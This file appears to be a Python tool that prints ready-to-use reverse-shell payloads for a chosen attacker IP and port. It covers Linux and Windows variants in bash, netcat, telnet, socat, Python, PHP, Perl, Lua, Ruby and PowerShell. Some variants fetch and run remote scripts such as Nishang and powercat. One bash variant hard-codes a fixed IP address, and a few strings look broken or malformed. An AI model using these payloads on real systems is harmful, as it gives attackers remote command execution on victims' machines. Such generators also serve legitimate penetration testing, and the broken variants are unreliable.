#! /usr/local/bin/python3
import base64
import argparse
from colorama import Fore, Style
from prettytable import PrettyTable


class reverseShell():
    def typeBash(self, ip, port):
        return 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(ip, port)

    def typeBash1(self, ip, port):
        return '/bin/bash -i >& /dev/tcp/{0}/{1} 0<& 2>&1'.format(ip, port)

    def typeBash2(self, ip, port):
        return 'exec 5<>/dev/tcp/61.164.47.202/{1};cat <&5|while read line; do $line 2>&5 >&5;done'.format(ip, port)

    def typeBash3(self, ip, port):
        return 'exec /bin/sh 0</dev/tcp/{0}/{1} 1>&0 2>&0'.format(ip, port)

    def typeBash4(self, ip, port):
        return '0<&196;exec 196<>/dev/tcp/{0}/{1};sh <&196 >&196 2>&196'.format(ip, port)

    def typeBashEchoBase64(self, ip, port):
        shellcode = 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(
            ip, port).encode()
        b64shellcode = base64.b64encode(shellcode).decode()
        return 'echo {} | bash'.format(b64shellcode)

    def typeBashUDP(self, ip, port):
        return 'sh -i >& /dev/udp/{0}/{1} 0>&1'.format(ip, port)

    def typeBashBase64(self, ip, port):
        shellcode = 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(
            ip, port).encode()
        b64shellcode = base64.b64encode(shellcode).decode()
        return 'bash -c {echo,' + b64shellcode + '}|{base64,-d}|{bash,-i}'

    def typeNc(self, ip, port):
        return 'nc -e /bin/sh {0} {1}'.format(ip, port)

    def typeNc2(self, ip, port):
        return 'nc -c bash {0} {1}'.format(ip, port)

    def typeNc3(self, ip, port):
        return 'mknod backpipe p&&nc {0} {1} 0<backpipe|/bin/bash 1>backpipe'.format(ip, port)

    def typeNc4(self, ip, port):
        return 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1}>/tmp/f'.format(ip, port)

    def typeNc5(self, ip, port):
        return 'rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p 2>&1'.format(ip, port)

    def typeNc6(self, ip, port):
        return 'rm f;mkfifo f;cat f|/bin/sh -i 2<&1|nc {0} {1}<f'.format(ip, port)

    def typeNc7(self, ip, port):
        return 'rm -f x;mknod x p && nc {0} {1} 0<x|/bin/bash 1>x'.format(ip, port)

    def typeTelnet(self, ip, port):
        return 'rm -f /tmp/p;mknod /tmp/p p && telnet {0} {1} 0/tmp/p 2>&1'.format(ip, port)

    def typeTelnet1(self, ip, port):
        return 'telnet {0} {1}|/bin/bash|telnet {2} 100000000'.format(ip, port, ip)

    def typeTelnet2(self, ip, port):
        return 'rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {0} {1}>f'.format(ip, port)

    def typeTelnet3(self, ip, port):
        return 'rm -f x;mknod x p && telnet {0} {1} 0<x|/bin/bash 1>x'.format(ip, port)

    def typeSocat(self, ip, port):
        return '[C2] socat TCP-LISTEN:{0} -\n[Target] socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{1}:{2}'.format(ip, ip, port)

    def typePython(self, ip, port):
        return 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(ip, port)

    def typeJava(self, ip, port):
        return '''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5|while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()'''.format(ip, port)

    def typePhp(self, ip, port):
        return 'php -r \'$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(ip, port)

    def typePhp2(self, ip, port):
        return 'php -r \'$s=fsockopen("{0}",{1});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);\''.format(ip, port)

    def typePhp3(self, ip, port):
        return 'php -r \'$s=fsockopen("{0}",{1});shell_exec("/bin/sh -i <&3 >&3 2>&3");\''.format(ip, port)

    def typePhp4(self, ip, port):
        return 'php -r \'$s=fsockopen("{0}",{1});`/bin/sh -i <&3 >&3 2>&3`;\''.format(ip, port)

    def typePhp5(self, ip, port):
        return 'php -r \'$s=fsockopen("{0}",{1});system("/bin/sh -i <&3 >&3 2>&3");\''.format(ip, port)

    def typePhp6(self, ip, port):
        return 'php -r \'$s=fsockopen("{0}",{1});popen("/bin/sh -i <&3 >&3 2>&3", "r");\''.format(ip, port)

    def typePhp7(self, ip, port):
        return """php -r '$s="{0}";$p={1};@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){{if($x=proc_open("/bin/sh$IFS-i",array(array("pipe","r"),array("pipe","w"),array("pipe","w")),$p,getcwd())){{stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){{if(feof($s))die("connection/closed");if(feof($p[1]))die("shell/not/response");$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}}else{{die("proc_open/disabled");}}}}else{{die("not/connect");}}'""".format(ip, port)

    def typePerl(self, ip, port):
        return 'perl -e \'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''.format(ip, port)

    def typePerlW(self, ip, port):
        return 'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''.format(ip, port)

    def typeWhois(self, ip, port):
        return '[C2] nc -lvp {0}\n[Target] whois -h {1} -p {2} `whoami`'.format(port, ip, port)

    def typeAwk(self, ip, port):
        return '''awk 'BEGIN {{s = "/inet/tcp/0/{0}/{1})"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null'''.format(ip, port)

    def typeTclsh(self, ip, port):
        return '''echo 'set s [socket {0} {1}];while 42 {{ puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {{![catch {{set r [eval $e]}} err]}} {{ puts $s $r }}; flush $s; }}; close $s;' | tclsh'''.format(ip, port)

    def typeLua(self, ip, port):
        return '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{0}','{1}');os.execute('/bin/sh -i <&3 >&3 2>&3');"'''.format(ip, port)

    def typeLua2(self, ip, port):
        return '''lua5.1 -e \'local host, port = "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''''.format(ip, port)

    def typeLuaW(self, ip, port):
        return '''lua5.1 -e \'local host, port = "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''''.format(ip, port)

    def typeRuby(self, ip, port):
        return 'ruby -rsocket -e\'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''.format(ip, port)

    def typeRuby1(self, ip, port):
        return 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''.format(ip, port)

    def typeRubyW(self, ip, port):
        return 'ruby -rsocket -e \'c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''.format(ip, port)

    def typePowershellW(self, ip, port):
        return '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''.format(ip, port)

    def typePowershell2W(self, ip, port):
        return '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''.format(ip, port)

    def typePowercatW(self, ip, port):
        return 'System.Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\');powercat -c {0} -p {1} -e cmd'.format(ip, port)

    def typeNcW(self, ip, port):
        return 'nc.exe {0} {1} -e c:\\windows\\system32\\cmd.exe'.format(ip, port)

    def typeNishangTCPW(self, ip, port):
        return 'IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp -Reverse -IPAddress {0} -port {1}'.format(ip, port)

    def typeNishangUDPW(self, ip, port):
        return '''IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress {0} -port {1}'''.format(ip, port)

    def typeMsfPowershellW(self, ip, port):
        return '''[C2 generate]$ msfvenom -p cmd/windows/reverse_powershell LHOST={0} LPORT={1}
[Target] powershell -w hidden -nop -c $a='{2}';$b={3};$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {{start-sleep -m 100;if ($osread.IsCompleted -and $osread.Result -ne 0){{$r=$os.BaseStream.EndRead($osread);$s.Write($ob,0,$r);$s.Flush();$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);}}if ($esread.IsCompleted -and $esread.Result -ne 0) {{$r=$es.BaseStream.EndRead($esread);$s.Write($eb,0,$r);$s.Flush();$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);}}if ($s.DataAvailable) {{$r=$s.Read($nb,0,$nb.Length);if ($r -lt 1) {{break;}} else {{$str=$e.GetString($nb,0,$r);$is.write($str);}}}}if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {{break;}}if ($p.ExitCode -ne $null) {{break;}}}}'''.format(ip, port, ip, port)


def limitline(contents, maxrow, maxline):
    lines = [contents.replace('\n', '⏎')]
    l = []
    for line in lines:
        if len(line) > maxrow:
            [l.append(line[i:i+maxrow]) for i in range(0, len(line), maxrow)]
        else:
            l.append(line)
    if len(l) > maxline:
        return '\n'.join(l[:maxline])[:-3] + '...'
    return '\n'.join(l[:maxline])


def cprint(title, contents):
    clength = len(contents) if not contents.startswith(
        '[C2 ') else len(contents.split('[Target] ')[-1])
    if title.endswith('W'):
        title = 'Win ' + title[:-1]
        title = Fore.LIGHTBLUE_EX + Style.BRIGHT + title + Style.NORMAL + \
            Style.DIM + ' Size:' + str(clength) + Style.RESET_ALL
        print(title + '\n' + contents)
    else:
        title = Fore.MAGENTA + Style.BRIGHT + title + Style.NORMAL + \
            Style.DIM + ' Size:' + str(clength) + Style.RESET_ALL
        print(title + '\n' + contents)


def nprint(title, contents):
    clength = len(contents) if not contents.startswith(
        '[C2 ') else len(contents.split('[Target] ')[-1])
    if title.endswith('W'):
        title = 'Win ' + title[:-1]
        title = '*' + title + '* Size:' + str(clength)
        print(title + '\n' + contents)
    else:
        title = '*' + title + '* Size:' + str(clength)
        print(title + '\n' + contents)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Quick generate reverse shell payload. By AbelChe.')
    parser.add_argument('target', metavar='192.168.1.1:7777',
                        nargs=1, help='c2ip:port')
    group = parser.add_argument_group('normal mode display')
    group.add_argument('--nocolor', action='store_true',
                       help='don\'t display color.')
    tgroup = parser.add_argument_group('table mode display')
    tgroup.add_argument('--table', action='store_true',
                        help='display with table mode.')
    tgroup.add_argument('--maxrow', default=60,
                        help='set the max length of each \'command\' table line when displaying')
    tgroup.add_argument('--maxline', default=1,
                        help='set the max length of each \'command\' table line when displaying')
    args = parser.parse_args()

    NOCOLOR = False
    TABLEMODE = False
    TARGET = args.target[0]
    if args.nocolor:
        NOCOLOR = True
    if args.table:
        TABLEMODE = True
    MAXROW = int(args.maxrow) if NOCOLOR else int(args.maxrow)
    MAXLINE = int(args.maxline) if NOCOLOR else int(args.maxline)

    ip, port = TARGET.split(':')
    if int(port) > 65535 or int(port) < 0:
        print(Fore.RED + 'Port error, between 1 and 65535')
        exit(1)
    R = reverseShell()
    if not TABLEMODE:
        for i in dir(R):
            if not i.startswith('type'):
                continue
            cmd = f'onecommand = R.{i}(ip, port)'
            exec(cmd)
            nprint(i, onecommand) if NOCOLOR else cprint(i, onecommand)
    else:
        table = PrettyTable(
            ['#', 'OSType', 'Name', 'Size', 'Command'], align='l')
        n = 0
        for i in dir(R):
            if not i.startswith('type'):
                continue
            n += 1
            cmd = f'onecommand = R.{i}(ip, port)'
            exec(cmd)
            if NOCOLOR:
                name = i.replace('type', '')[
                    :-1] if i.endswith('W') else i.replace('type', '')
                ostype = 'Windows' if i.endswith('W') else 'Linux'
                command = limitline(onecommand, MAXROW, MAXLINE)
            else:
                LF = Fore.MAGENTA + Style.BRIGHT
                WF = Fore.LIGHTBLUE_EX + Style.BRIGHT
                E = Style.RESET_ALL
                name = LF + \
                    i.replace('type', '')[
                        :-1] + E if i.endswith('W') else WF + i.replace('type', '') + E
                ostype = LF + 'Windows' + \
                    E if i.endswith('W') else WF + 'Linux' + E
                parsedline = limitline(onecommand, MAXROW, MAXLINE)
                command = '\n'.join([LF + l + E for l in parsedline.splitlines()]) if i.endswith(
                    'W') else '\n'.join([WF + l + E for l in parsedline.splitlines()])
            clength = len(onecommand) if not onecommand.startswith(
                '[C2 ') else len(onecommand.split('[Target] ')[-1])
            table.add_row([n, ostype, name, str(clength), command])
        print(table)
